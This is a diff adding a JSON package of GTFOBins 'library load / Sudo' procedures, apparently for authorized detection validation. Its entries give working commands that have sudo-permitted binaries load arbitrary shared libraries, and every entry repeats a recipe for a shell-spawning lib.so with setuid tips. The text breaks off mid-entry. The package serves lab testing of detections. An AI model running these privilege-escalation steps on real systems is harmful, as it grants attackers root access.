@@ -1,0 +1,2072 @@
+{
+  "package_id": "gtfobins-library-load-sudo-v1",
+  "package_name": "GTFOBins - Library Load / Sudo",
+  "version": "1.0.0",
+  "summary": "36 source-derived GTFOBins Living-Off-The-Land procedures for library load / Sudo.",
+  "description": "Faithful, deterministic conversion of explicit GTFOBins procedures. Commands retain upstream behavior while environment values use Morgana Tags.",
+  "purpose": "Run authorized Living-Off-The-Land detection validation using legitimate native or commonly available utilities in adversary-like ways.",
+  "capabilities": [
+    "Provides 36 distinct source procedures grouped by library-load / Sudo.",
+    "Preserves source identity, ATT&CK mappings, execution context, prerequisites, and provider metadata.",
+    "Supports deterministic content-only updates from pinned upstream commits."
+  ],
+  "use_cases": [
+    "Validate endpoint and network detections for authorized Living-Off-The-Land behavior.",
+    "Search and import only the utility, function, context, platform, or ATT&CK coverage needed for an exercise."
+  ],
+  "safety_notes": [
+    "Review every command, Tag, privilege requirement, and readiness classification before execution.",
+    "Interactive, elevated, SUID, capability, and counterpart-dependent procedures require an explicitly prepared lab.",
+    "No upstream command is executed during conversion or import."
+  ],
+  "prerequisites": [
+    "The referenced Linux/Unix binary must exist on the target.",
+    "Operator-supplied Tags and any declared privilege or network counterpart must be configured.",
+    "Explicit authorization for the target and procedure behavior."
+  ],
+  "author": "GTFOBins / X3M.AI conversion",
+  "created": "2026-08-28",
+  "script_prefix": "GTFOBINS - ",
+  "provider": "gtfobins",
+  "source": "gtfobins",
+  "source_repository": "https://github.com/GTFOBins/GTFOBins.github.io",
+  "source_commit": "acd524623f9c406acedd2754ebd9c2431f3675ad",
+  "source_license": "GPL-3.0",
+  "documentation_url": "https://github.com/GTFOBins/GTFOBins.github.io",
+  "mitre_domain": "enterprise-attack",
+  "mitre_tactic": "Library Load",
+  "mitre_tcodes": [
+    "T1574"
+  ],
+  "platform": [
+    "linux"
+  ],
+  "risk_badges": [
+    "modify"
+  ],
+  "readiness_counts": {
+    "environment_prerequisite": 34,
+    "interactive": 2
+  },
+  "category": "lotl/gtfobins",
+  "tag_categories": [
+    {
+      "category_id": "lotl_gtfobins_parameters",
+      "label": "GTFOBins Runtime Parameters",
+      "description": "Operator-supplied values shared by Living-Off-The-Land procedures.",
+      "scope": "local",
+      "tags": [
+        {
+          "key": "lotl_gtfobins_local_path",
+          "label": "Local Path",
+          "description": "Operator-supplied local path for this authorized LOTL procedure. Source token: /path/to/temp-file.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "local_path"
+        },
+        {
+          "key": "lotl_gtfobins_payload_path",
+          "label": "Payload Path",
+          "description": "Operator-supplied payload path for this authorized LOTL procedure. Source token: /path/to/lib\\.so.",
+          "sensitive": false,
+          "required": true,
+          "default": "",
+          "example": "",
+          "parameter_class": "payload_path"
+        }
+      ]
+    }
+  ],
+  "assets": [],
+  "scripts": [
+    {
+      "id": "gtfobins:bash:library-load:0:sudo::",
+      "name": "GTFOBINS - T1574 - bash - Library load - Sudo [da4563f]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: bash. Context: Sudo.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "bash -c 'enable -f #{lotl_gtfobins_payload_path} x'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/bash",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/bash",
+        "source_bin": "bash",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:bash:library-load:0:sudo::",
+        "source_name": "bash",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `bash` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:bundle:library-load:0:sudo:1:bundle>irb>ruby",
+      "name": "GTFOBINS - T1574 - bundle - Library load - Sudo [3651674]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: bundle. Context: Sudo. Inherits library-load behavior from irb. This allows to run Ruby code (`...`). Inherits library-load behavior from ruby.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "touch Gemfile\nbundle console\nirb\n...\nruby -e 'require \"fiddle\"; Fiddle.dlopen(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/bundle",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/bundle",
+        "source_bin": "bundle",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "irb",
+        "inheritance_path": [
+          "bundle",
+          "irb",
+          "ruby"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "irb",
+          "inheritance_path": [
+            "bundle",
+            "irb",
+            "ruby"
+          ],
+          "inherit_index": 1
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:bundle:library-load:0:sudo:1:bundle>irb>ruby",
+        "source_name": "bundle",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `bundle` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:byebug:library-load:0:sudo:0:byebug>ruby",
+      "name": "GTFOBINS - T1574 - byebug - Library load - Sudo [8cf277b]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: byebug. Context: Sudo. Inherits library-load behavior from ruby.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "byebug --no-stop /path/to/script.rb\nruby -e 'require \"fiddle\"; Fiddle.dlopen(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/byebug",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/byebug",
+        "source_bin": "byebug",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "ruby",
+        "inheritance_path": [
+          "byebug",
+          "ruby"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "ruby",
+          "inheritance_path": [
+            "byebug",
+            "ruby"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:byebug:library-load:0:sudo:0:byebug>ruby",
+        "source_name": "byebug",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `byebug` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:curl:library-load:0:sudo::",
+      "name": "GTFOBINS - T1574 - curl - Library load - Sudo [e18541f]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: curl. Context: Sudo.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "curl --engine #{lotl_gtfobins_payload_path} x",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/curl",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/curl",
+        "source_bin": "curl",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:curl:library-load:0:sudo::",
+        "source_name": "curl",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `curl` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:dstat:library-load:0:sudo:0:dstat>python",
+      "name": "GTFOBINS - T1574 - dstat - Library load - Sudo [2e3a9fd]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: dstat. Context: Sudo. `dstat` allows you to run arbitrary Python scripts loaded as \"external plugins\" if they are located in one of the directories, stated in the `dstat` man page under \"FILES\": - `~/.dstat/` - `(path of binary)/plugins/` - `/usr/share/dstat/` - `/usr/local/share/dstat/` Pick the one that you can write into. The plugin named `xxx` file name must be defined in the `dstat_xxx.py` file. Inherits library-load behavior from python.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "dstat --xxx\npython -c 'from ctypes import cdll; cdll.LoadLibrary(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/dstat",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/dstat",
+        "source_bin": "dstat",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "dstat",
+          "python"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "python",
+          "inheritance_path": [
+            "dstat",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:dstat:library-load:0:sudo:0:dstat>python",
+        "source_name": "dstat",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `dstat` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:easy_install:library-load:0:sudo:0:easy_install>python",
+      "name": "GTFOBINS - T1574 - easy_install - Library load - Sudo [30799a0]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: easy_install. Context: Sudo. This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`). Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example: ``` echo 'import os; os.system(\"exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty\")' >setup.py ``` Inherits library-load behavior from python.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo '...' >setup.py\neasy_install .\npython -c 'from ctypes import cdll; cdll.LoadLibrary(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/easy_install",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/easy_install",
+        "source_bin": "easy_install",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "easy_install",
+          "python"
+        ],
+        "interactive": true,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "python",
+          "inheritance_path": [
+            "easy_install",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:easy_install:library-load:0:sudo:0:easy_install>python",
+        "source_name": "easy_install",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "interactive",
+        "prerequisites": [
+          "The `easy_install` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:facter:library-load:0:sudo:1:facter>ruby",
+      "name": "GTFOBINS - T1574 - facter - Library load - Sudo [f103212]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: facter. Context: Sudo. The first `.rb` file in the `/path/to/dir/` directory will be executed. Inherits library-load behavior from ruby.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "facter --custom-dir=/path/to/dir/ x\nruby -e 'require \"fiddle\"; Fiddle.dlopen(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/facter",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/facter",
+        "source_bin": "facter",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "ruby",
+        "inheritance_path": [
+          "facter",
+          "ruby"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "ruby",
+          "inheritance_path": [
+            "facter",
+            "ruby"
+          ],
+          "inherit_index": 1
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:facter:library-load:0:sudo:1:facter>ruby",
+        "source_name": "facter",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `facter` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:facter:library-load:0:sudo:0:facter>ruby",
+      "name": "GTFOBINS - T1574 - facter - Library load - Sudo [35de8aa]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: facter. Context: Sudo. The first `.rb` file in the `/path/to/dir/` directory will be executed. Inherits library-load behavior from ruby.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "FACTERLIB=/path/to/dir/ facter\nruby -e 'require \"fiddle\"; Fiddle.dlopen(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/facter",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/facter",
+        "source_bin": "facter",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "ruby",
+        "inheritance_path": [
+          "facter",
+          "ruby"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "ruby",
+          "inheritance_path": [
+            "facter",
+            "ruby"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:facter:library-load:0:sudo:0:facter>ruby",
+        "source_name": "facter",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `facter` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:ffmpeg:library-load:0:sudo::",
+      "name": "GTFOBINS - T1574 - ffmpeg - Library load - Sudo [ca562ba]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: ffmpeg. Context: Sudo.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "ffmpeg -f lavfi -i anullsrc -af ladspa=file=#{lotl_gtfobins_payload_path} #{lotl_gtfobins_local_path}.wav\nreset^J",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path",
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/ffmpeg",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/ffmpeg",
+        "source_bin": "ffmpeg",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:ffmpeg:library-load:0:sudo::",
+        "source_name": "ffmpeg",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `ffmpeg` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:gdb:library-load:0:sudo:0:gdb>python",
+      "name": "GTFOBINS - T1574 - gdb - Library load - Sudo [1c603e6]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: gdb. Context: Sudo. This allows to run Python code (`...`). Inherits library-load behavior from python.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "gdb -nx -ex 'python ...' -ex quit\npython -c 'from ctypes import cdll; cdll.LoadLibrary(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/gdb",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/gdb",
+        "source_bin": "gdb",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "python",
+        "inheritance_path": [
+          "gdb",
+          "python"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "python",
+          "inheritance_path": [
+            "gdb",
+            "python"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:gdb:library-load:0:sudo:0:gdb>python",
+        "source_name": "gdb",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `gdb` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:gem:library-load:0:sudo:1:gem>ruby",
+      "name": "GTFOBINS - T1574 - gem - Library load - Sudo [2b9c449]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: gem. Context: Sudo. Inherits library-load behavior from ruby.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "gem build /path/to/script.rb\nruby -e 'require \"fiddle\"; Fiddle.dlopen(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/gem",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/gem",
+        "source_bin": "gem",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "ruby",
+        "inheritance_path": [
+          "gem",
+          "ruby"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "ruby",
+          "inheritance_path": [
+            "gem",
+            "ruby"
+          ],
+          "inherit_index": 1
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:gem:library-load:0:sudo:1:gem>ruby",
+        "source_name": "gem",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `gem` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:gem:library-load:0:sudo:2:gem>ruby",
+      "name": "GTFOBINS - T1574 - gem - Library load - Sudo [93aad7c]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: gem. Context: Sudo. Inherits library-load behavior from ruby.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "gem install --file /path/to/script.rb\nruby -e 'require \"fiddle\"; Fiddle.dlopen(\"#{lotl_gtfobins_payload_path}\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/gem",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/gem",
+        "source_bin": "gem",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "ruby",
+        "inheritance_path": [
+          "gem",
+          "ruby"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "ruby",
+          "inheritance_path": [
+            "gem",
+            "ruby"
+          ],
+          "inherit_index": 2
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:gem:library-load:0:sudo:2:gem>ruby",
+        "source_name": "gem",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `gem` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:gimp:library-load:0:sudo:0:gimp>python",
+      "name": "GTFOBINS - T1574 - gimp - Library load - Sudo [a5c2b75]",
